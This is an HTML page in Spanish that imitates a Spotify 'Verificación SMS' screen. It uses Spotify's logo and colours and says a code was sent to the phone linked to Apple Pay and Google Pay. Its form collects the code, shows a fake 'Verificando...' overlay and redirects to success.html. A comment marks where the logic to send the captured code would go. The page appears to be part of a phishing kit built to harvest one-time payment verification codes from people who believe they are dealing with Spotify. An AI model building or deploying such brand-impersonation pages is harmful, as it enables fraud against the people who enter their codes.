<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación SMS - Spotify</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #000;
            color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            box-sizing: border-box;
        }
        .logo {
            width: 180px;
            display: block;
            margin: 0 auto 30px;
        }
        .login-form {
            background-color: #121212;
            padding: 30px;
            border-radius: 10px;
        }
        h2 {
            text-align: center;
            margin-bottom: 30px;
            font-size: 28px;
        }
        input {
            width: 100%;
            padding: 15px;
            margin-bottom: 20px;
            border: none;
            border-radius: 5px;
            background-color: #282828;
            color: #fff;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 15px;
            background-color: #1DB954;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #1ed760;
        }
        p {
            text-align: center;
            color: #b3b3b3;
        }
        a {
            color: #1DB954;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        #loading {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .spinner {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #1DB954;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .payment-methods {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 20px 0;
        }
        .payment-methods img {
            height: 30px;
            opacity: 0.8;
        }
        .sms-info {
            font-size: 14px;
            color: #b3b3b3;
            text-align: center;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <img src="spotify-logo.png" alt="Spotify Logo" class="logo">
        </header>

        <section class="login-form">
            <h2>Verificación SMS</h2>
            
            <div class="sms-info">
                Hemos enviado un código de verificación a tu teléfono vinculado con Apple Pay y Google Pay.
            </div>
            
            <div class="payment-methods">
                <img src="applepay.png" alt="Apple Pay">
                <img src="googlepay.png" alt="Google Pay">
            </div>

            <form id="smsForm" method="POST" novalidate>
                <input type="text" id="sms-code" name="sms-code" placeholder="Código SMS" required autofocus>
                
                <button type="submit" id="btn-submit">VERIFICAR</button>
            </form>

            <p><a href="#">Reenviar código</a></p>
        </section>
    </div>

    <!-- Overlay de carga -->
    <div id="loading">
        <div style="color:white;text-align:center;">
            <div class="spinner"></div>
            <div>Verificando...</div>
        </div>
    </div>

    <script>
        document.getElementById("smsForm").addEventListener("submit", function(e) {
            e.preventDefault();
            document.getElementById("loading").style.display = "flex";
            document.getElementById("btn-submit").disabled = true;

            const smsCode = document.getElementById("sms-code").value.trim();
            
            // Aquí iría tu lógica de validación / envío
            console.log("Código introducido:", smsCode);

            setTimeout(() => window.location.href = "success.html", 1500);
        });
    </script>
</body>
</html>
